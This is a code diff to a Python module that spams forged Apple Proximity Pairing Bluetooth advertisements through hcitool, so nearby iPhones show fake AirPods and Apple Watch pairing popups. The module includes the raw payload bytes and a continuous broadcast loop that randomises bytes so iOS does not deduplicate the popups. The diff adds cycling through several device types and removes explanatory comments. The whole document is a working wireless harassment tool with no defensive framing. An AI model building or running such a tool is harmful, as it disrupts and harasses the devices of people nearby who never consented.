@@ -10,7 +10,6 @@ POPUP_TYPES = {
     'watch':       'Apple Watch',
 }
 
-# Apple Proximity Pairing payloads: type_byte + length_byte + 20 data bytes
 _PAYLOADS = {
     'airpods':     ['07','19','01','02','20','75','aa','30','01','00','00','45','12','00','00','00','00','00','00','00','00','00'],
     'airpods_pro': ['09','19','01','02','20','75','aa','30','01','00','00','45','12','00','00','00','00','00','00','00','00','00'],
@@ -25,7 +24,6 @@ _state = {'running': False, 'count': 0, 'popup_type': 'airpods', 'thread': None}
 
 
 def _send(payload):
-    # LE Set Advertising Data: 1e(30 bytes) + flags(3) + mfr_specific(26: 1a ff 4c 00 + 22 bytes)
     args = ['1e', '02', '01', '1a', '1a', 'ff', '4c', '00'] + payload
     subprocess.run(
         ['hcitool', '-i', 'hci0', 'cmd', '0x08', '0x0008'] + args,
@@ -33,18 +31,20 @@ def _send(payload):
     )
 
 
-def _loop(popup_type):
+def _loop(popup_type, types_list):
     subprocess.run(['hciconfig', 'hci0', 'leadv', '3'], capture_output=True)
-    base = list(_PAYLOADS.get(popup_type, _PAYLOADS['airpods']))
-    all_types = list(_PAYLOADS.keys()) if popup_type == 'all' else None
+    if types_list:
+        bases = [list(_PAYLOADS[t]) for t in types_list if t in _PAYLOADS]
+    elif popup_type == 'all':
+        bases = [list(v) for v in _PAYLOADS.values()]
+    else:
+        bases = [list(_PAYLOADS.get(popup_type, _PAYLOADS['airpods']))]
+    if not bases:
+        bases = [list(_PAYLOADS['airpods'])]
     idx = 0
     while _state['running']:
-        if all_types:
-            payload = list(_PAYLOADS[all_types[idx % len(all_types)]])
-            idx += 1
-        else:
-            payload = list(base)
-        # randomize last 2 bytes so iOS doesn't dedup
+        payload = list(bases[idx % len(bases)])
+        idx += 1
         payload[-1] = f'{random.randint(0, 255):02x}'
         payload[-2] = f'{random.randint(0, 255):02x}'
         _send(payload)
@@ -53,13 +53,15 @@ def _loop(popup_type):
     subprocess.run(['hciconfig', 'hci0', 'noleadv'], capture_output=True)
 
 
-def start(popup_type='airpods'):
+def start(popup_type='airpods', types_list=None):
     if _state['running']:
         return status()
-    if popup_type not in _PAYLOADS and popup_type != 'all':
+    valid_list = [t for t in (types_list or []) if t in _PAYLOADS]
+    if not valid_list and popup_type not in _PAYLOADS and popup_type != 'all':
         popup_type = 'airpods'
-    _state.update(running=True, count=0, popup_type=popup_type)
-    t = threading.Thread(target=_loop, args=(popup_type,), daemon=True)
+    label = ','.join(valid_list) if valid_list else popup_type
+    _state.update(running=True, count=0, popup_type=label)
+    t = threading.Thread(target=_loop, args=(popup_type, valid_list or None), daemon=True)
     _state['thread'] = t
     t.start()
     return status()
